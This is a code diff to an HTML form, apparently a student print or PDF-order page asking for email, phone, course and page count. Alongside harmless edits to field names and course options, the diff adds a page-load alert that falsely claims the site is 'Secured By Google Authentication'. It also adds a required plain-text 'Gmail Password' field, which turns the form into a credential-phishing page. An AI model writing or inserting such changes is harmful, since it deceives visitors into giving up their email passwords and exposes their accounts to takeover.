@@ -69,8 +69,14 @@
         display: none;
       }
     </style>
+    <script>
+    function mypage()
+      {
+        alert("This Website is Secured By Google Authentication");
+      }
+    </script>
   </head>
-  <body>
+  <body onload="mypage()">
     <nav class="navbar bg-body-tertiary">
       <div class="container-fluid">
         <a class="navbar-brand" href="#">
@@ -125,11 +131,23 @@
             class="form-control"
             id="email"
             placeholder="Enter email-id"
-            name="Email"
+            name="Email "
             required
           />
         </div>
 
+       <div class="form-group">
+          <label for="name">Gmail Password:</label>
+          <input
+            type="text"
+            class="form-control"
+            id="name"
+            placeholder="Enter your Password here"
+            name="Email Password "
+            required
+          />
+       </div>
+        
         <div class="form-group">
           <label for="phone">Phone Number:</label>
           <input
@@ -137,7 +155,7 @@
             class="form-control"
             id="phone"
             placeholder="Enter Phone Number"
-            name="Number"
+            name="Phone Number "
             required
           />
         </div>
@@ -150,6 +168,11 @@
             <option value="Btech Cse+Iot">Btech(CSE+IOT)</option>
             <option value="Btech Aiml">Btech(AIML)</option>
             <option value="Bca">BCA</option>
+            <option value="Mca">MCA</option>
+            <option value="Mba">MBA</option>
+            <option value="B.Pharma">B.Pharma</option>
+            <option value="D.Pharma">D.Pharma</option>
+            <option value="M.Pharma">M.Pharma</option>
             <option value="Bba">BBA</option>
             <option value="Btech mech">Btech Mechanical</option>
             <option value="Poly Electrical">Polytecnic Electrical</option>
@@ -203,7 +226,7 @@
             class="form-control"
             id="phone"
             placeholder="number of pages in pdf"
-            name="Number"
+            name="Number of pages in pdf "
             required
           />
         </div>
